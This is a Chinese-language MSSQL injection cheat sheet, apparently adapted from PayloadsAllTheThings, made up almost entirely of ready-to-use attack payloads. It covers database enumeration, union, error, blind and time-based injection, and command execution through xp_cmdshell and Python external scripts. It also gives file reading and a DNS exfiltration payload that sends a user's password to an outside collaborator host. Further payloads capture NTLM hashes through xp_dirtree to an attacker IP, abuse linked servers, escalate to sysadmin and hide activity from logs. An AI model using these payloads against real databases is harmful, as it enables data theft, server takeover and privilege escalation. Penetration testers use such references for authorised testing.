# MSSQL Injection - MSSQL注入攻击

[SEARCH_KEYWORDS]
漏洞类型: SQL Injection MSSQL Microsoft SQL Server 数据库注入
攻击类型: Data Extraction Command Execution Privilege Escalation
关键词: MSSQL SQL Server xp_cmdshell UNION error-based blind time-based
技术: Stacked Query xp_cmdshell UNC Path DNS Exfiltration Trusted Links
工具: sqlmap DB_NAME HOST_NAME CONVERT CAST
版本: MSSQL 2000 MSSQL 2005 MSSQL 2008 MSSQL 2012 MSSQL 2017

[CONTENT]

## MSSQL注入概述

MSSQL注入是一种安全漏洞，攻击者可在Microsoft SQL Server执行的查询中注入恶意SQL代码。可能导致未授权数据访问、数据篡改甚至获取数据库服务器控制权。

## MSSQL默认数据库

| 名称 | 描述 |
|------|------|
| pubs | MSSQL 2005不可用 |
| model | 所有版本可用 |
| msdb | 所有版本可用 |
| tempdb | 所有版本可用 |
| northwind | 所有版本可用 |
| information_schema | MSSQL 2000+可用 |

## MSSQL注释

| 类型 | 描述 |
|------|------|
| `/* */` | C风格注释 |
| `--` | SQL注释 |
| `;%00` | 空字节 |

## 信息枚举

```sql
SELECT @@version           -- DBMS版本
SELECT DB_NAME()           -- 数据库名
SELECT SCHEMA_NAME()       -- 数据库架构
SELECT HOST_NAME()         -- 主机名
SELECT CURRENT_USER        -- 当前用户
SELECT system_user         -- 系统用户
```

### 列数据库

```sql
SELECT name FROM master..sysdatabases;
SELECT name FROM master.sys.databases;
SELECT DB_NAME(N);         -- N = 0, 1, 2...
```

### 列表

```sql
SELECT name FROM <DBNAME>..sysobjects WHERE xtype='U'
SELECT table_name FROM information_schema.tables WHERE table_catalog='<DBNAME>'
```

### 列列

```sql
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'mytable')
SELECT column_name FROM information_schema.columns WHERE table_name='data_table'
```

## Union Based注入

```sql
SELECT name FROM master..sysdatabases
SELECT name FROM Injection..sysobjects WHERE xtype = 'U'
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')
SELECT UserId, UserName from Users
```

## Error Based注入

```sql
AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -
AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~')) -- -
AND 1337=CONCAT('~',(SELECT @@version),'~') -- -
CAST((SELECT @@version) AS INT)
```

## Blind Based注入

```sql
AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -
AND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97
AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90
```

## Time Based注入

```sql
ProductID=1;waitfor delay '0:0:10'--
IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'
IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';
```

## 命令执行

### XP_CMDSHELL

```sql
EXEC xp_cmdshell "net user";
EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
```

启用xp_cmdshell：

```sql
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
```

### Python脚本

```powershell
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
```

## 文件操作

### 读取文件

```sql
-1 union select null,(select x from OpenRowset(BULK 'C:\Windows\win.ini',SINGLE_CLOB) R(x)),null,null
```

### 写入文件

```sql
execute spWriteStringToFile 'contents', 'C:\path\to\', 'file'
```

## Out of Band数据外带

### DNS外带

```powershell
1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.xem',null,null))
```

### UNC Path获取NTLM

```sql
1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';--
xp_dirtree '\\attackerip\file'
xp_fileexist '\\attackerip\file'
```

## Trusted Links利用

```sql
select * from master..sysservers
select version from openquery("linkedserver", 'select @@version as version');
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
```

## 权限操作

```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
SELECT is_srvrolemember('sysadmin');
EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;
```

## OPSEC

使用`sp_password`隐藏日志：

```sql
' AND 1=1--sp_password
```

## 参考文档

原始来源: PayloadsAllTheThings/SQL Injection/MSSQL Injection.md